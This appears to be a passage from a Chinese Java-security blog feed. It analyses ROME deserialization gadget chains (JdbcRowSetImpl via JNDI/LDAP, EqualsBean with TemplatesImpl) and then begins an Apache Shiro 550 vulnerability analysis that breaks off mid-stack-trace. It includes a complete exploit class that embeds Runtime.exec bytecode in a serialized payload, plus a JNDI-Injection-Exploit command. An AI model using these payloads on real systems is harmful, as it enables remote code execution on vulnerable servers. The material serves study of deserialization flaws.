<h2 id="函数调用栈-4"><a href="#函数调用栈-4" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connect:<span class="number">615</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:<span class="number">4004</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">193</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:<span class="number">110</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">1397</span>, HashMap (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">42</span>, JdbcRowExp (RomeSec)</span><br></pre></td></tr></table></figure>

<h2 id="详细分析-4"><a href="#详细分析-4" class="headerlink" title="详细分析"></a>详细分析</h2><p>这条链的组合是前半部分不变，修改后半部分，即替换前面的TemplatesImpl为JdbcRowSetImpl，后面的链就会发生变化</p>
<p>同样在ToStringBean的toString方法中，会调用getPropertyDescriptors来获得JdbcRowSetImpl的所有公开的get方法，然后逐个使用invoke调用<br>而在JdbcRowSetImpl链中的关键是调用getDatabaseMetaData方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231124174626.png"></p>
<p>在JdbcRowSetImpl的getDatabaseMetaData方法中会调用connect方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> DatabaseMetaData <span class="title function_">getDatabaseMetaData</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="built_in">this</span>.connect();</span><br><span class="line">    <span class="keyword">return</span> var1.getMetaData();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入connect方法，会调用lookup函数，所以这里的getDataSourceName的返回值非常关键，需要是可以利用的ldap链接，所以在exp中进行如下设置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ldap url</span></span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/nils4f&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建JdbcRowSetImpl对象</span></span><br><span class="line"><span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line"><span class="type">Field</span> <span class="variable">dataSource</span> <span class="operator">=</span> BaseRowSet.class.getDeclaredField(<span class="string">&quot;dataSource&quot;</span>);</span><br><span class="line">dataSource.setAccessible(<span class="literal">true</span>);</span><br><span class="line">dataSource.set(jdbcRowSet, url);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231124175014.png"></p>
<p>其中LDAP服务可以通过JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar工具开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc -A 127.0.0.1</span><br></pre></td></tr></table></figure>

<h1 id="EqualsBean利用链"><a href="#EqualsBean利用链" class="headerlink" title="EqualsBean利用链"></a>EqualsBean利用链</h1><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">EqualsBean.beanEquals()</span><br><span class="line">EqualsBean.equals()</span><br><span class="line">AbstractMap.equals()</span><br><span class="line">HashMap.putVal()</span><br><span class="line">HashMap.put()</span><br><span class="line">HashSet.readObject()</span><br></pre></td></tr></table></figure>

<h2 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RomeSec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EqualsBeanExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意类</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;cccc&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建TemplatesImpl对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">templateImpl</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;s&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>, bean);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>, templateImpl);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, bean);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, templateImpl);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        table.add(map1);</span><br><span class="line">        table.add(map2);</span><br><span class="line"></span><br><span class="line">        setFiled(bean, <span class="string">&quot;_beanClass&quot;</span>, Templates.class);</span><br><span class="line">        setFiled(bean, <span class="string">&quot;_obj&quot;</span>, templateImpl);</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;EqualsBean.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(table);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;EqualsBean.bin&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFiled</span><span class="params">(Object o, String fieldname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> o.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="函数调用栈-5"><a href="#函数调用栈-5" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect) [<span class="number">2</span>]</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">beanEquals:<span class="number">146</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">equals:<span class="number">103</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">equals:<span class="number">472</span>, AbstractMap (java.util)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">334</span>, HashSet (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect) [<span class="number">1</span>]</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">62</span>, EqualsBeanExp (RomeSec)</span><br></pre></td></tr></table></figure>

<h2 id="详细分析-5"><a href="#详细分析-5" class="headerlink" title="详细分析"></a>详细分析</h2><p>在EqualsBean的beanEquals方法中也能够获取类的get方法并调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">beanEquals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean1</span> <span class="operator">=</span> <span class="built_in">this</span>._obj;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean2</span> <span class="operator">=</span> obj;</span><br><span class="line">    <span class="type">boolean</span> eq;</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">        eq = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bean1 == <span class="literal">null</span> &amp;&amp; obj == <span class="literal">null</span>) &#123;</span><br><span class="line">        eq = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bean1 != <span class="literal">null</span> &amp;&amp; obj != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 注意这句</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>._beanClass.isInstance(obj)) &#123;</span><br><span class="line">            eq = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            eq = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 获取方法</span></span><br><span class="line">                PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br><span class="line">                <span class="keyword">if</span> (pds != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; eq &amp;&amp; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                        <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                        <span class="keyword">if</span> (pReadMethod != <span class="literal">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="comment">// 这里</span></span><br><span class="line">                            <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> pReadMethod.invoke(bean1, NO_PARAMS);</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> pReadMethod.invoke(bean2, NO_PARAMS);</span><br><span class="line">                            eq = <span class="built_in">this</span>.doEquals(value1, value2);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Could not execute equals()&quot;</span>, var10);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        eq = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eq;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而调用此方法的是EqualsBean的equals方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.beanEquals(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在HashMap的putVal方法中<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231125171144.png"></p>
<p>在进入AbstractMap的equals方法中，这里就是对两个map元素逐个比较<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231125171602.png"></p>
<p><strong>注</strong>：这里的HashMap、HashSet、HashTable都可以相互替换</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://boogipop.com/2023/04/26/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/">易懂的Rome反序列化利用链(updated)</a></p>
<p><a href="https://xz.aliyun.com/t/12768">Java反序列化之ROME反序列化</a></p>
<p><a href="https://le1a.github.io/post/Rome/">Rome反序列化链分析</a></p>
<blockquote>
<p>注：本文首发于<a href="https://xz.aliyun.com/t/13286">https://xz.aliyun.com/t/13286</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Shiro反序列化漏洞分析</title>
    <url>/2023/05/02/Shiro-security/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>官方文档：<a href="https://shiro.apache.org/">https://shiro.apache.org/</a></p>
<blockquote>
<p>Apache Shiro™ is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. With Shiro’s easy-to-understand API, you can quickly and easily secure any application – from the smallest mobile applications to the largest web and enterprise applications.</p>
</blockquote>
<p>Apache Shiro是Java中的一个安全框架，可以执行身份验证、授权、加密和会话管理。<br>关于漏洞：<a href="https://shiro.apache.org/security-reports.html">https://shiro.apache.org/security-reports.html</a></p>
<h1 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>地址：<a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a><br>使用IDEA打开文件夹，修改samples中web目录下的pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;scope&gt;provided&lt;/scope&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.sourceforge.htmlunit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>htmlunit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;scope&gt;test&lt;/scope&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mortbay.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jetty<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jetty.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mortbay.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-2.1-jetty<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jetty.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用maven3.1.1版本，使用jdk1.6进行package<br>成功打包war包后，启动tomcat运行<br>搭建成功界面<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829144420.png"><br>使用用户名和密码进行登录，登录时需要点击“Remember Me”<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829145126.png"><br>抓包分析<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829145049.png"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="remeberMe的生成过程"><a href="#remeberMe的生成过程" class="headerlink" title="remeberMe的生成过程"></a>remeberMe的生成过程</h3><p>在org&#x2F;apache&#x2F;shiro&#x2F;web&#x2F;mgt&#x2F;CookieRememberMeManager类的rememberSerializedIdentity函数下断点，从函数字面可以猜测这应该是cookie设置的地方<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rememberSerializedIdentity:<span class="number">156</span>, CookieRememberMeManager (org.apache.shiro.web.mgt)</span><br><span class="line">rememberIdentity:<span class="number">347</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">rememberIdentity:<span class="number">321</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">onSuccessfulLogin:<span class="number">297</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">rememberMeSuccessfulLogin:<span class="number">206</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">onSuccessfulLogin:<span class="number">291</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">login:<span class="number">285</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">login:<span class="number">256</span>, DelegatingSubject (org.apache.shiro.subject.support)</span><br><span class="line">executeLogin:<span class="number">53</span>, AuthenticatingFilter (org.apache.shiro.web.filter.authc)</span><br><span class="line">onAccessDenied:<span class="number">154</span>, FormAuthenticationFilter (org.apache.shiro.web.filter.authc)</span><br><span class="line">onAccessDenied:<span class="number">133</span>, AccessControlFilter (org.apache.shiro.web.filter)</span><br><span class="line">onPreHandle:<span class="number">162</span>, AccessControlFilter (org.apache.shiro.web.filter)</span><br><span class="line">isFilterChainContinued:<span class="number">203</span>, PathMatchingFilter (org.apache.shiro.web.filter)</span><br><span class="line">preHandle:<span class="number">178</span>, PathMatchingFilter (org.apache.shiro.web.filter)</span><br><span class="line">doFilterInternal:<span class="number">131</span>, AdviceFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:<span class="number">125</span>, OncePerRequestFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:<span class="number">66</span>, ProxiedFilterChain (org.apache.shiro.web.servlet)</span><br><span class="line">executeChain:<span class="number">449</span>, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">call:<span class="number">365</span>, AbstractShiroFilter$<span class="number">1</span> (org.apache.shiro.web.servlet)</span><br><span class="line">doCall:<span class="number">90</span>, SubjectCallable (org.apache.shiro.subject.support)</span><br><span class="line">call:<span class="number">83</span>, SubjectCallable (org.apache.shiro.subject.support)</span><br><span class="line">execute:<span class="number">383</span>, DelegatingSubject (org.apache.shiro.subject.support)</span><br><span class="line">doFilterInternal:<span class="number">362</span>, AbstractShiroFilter 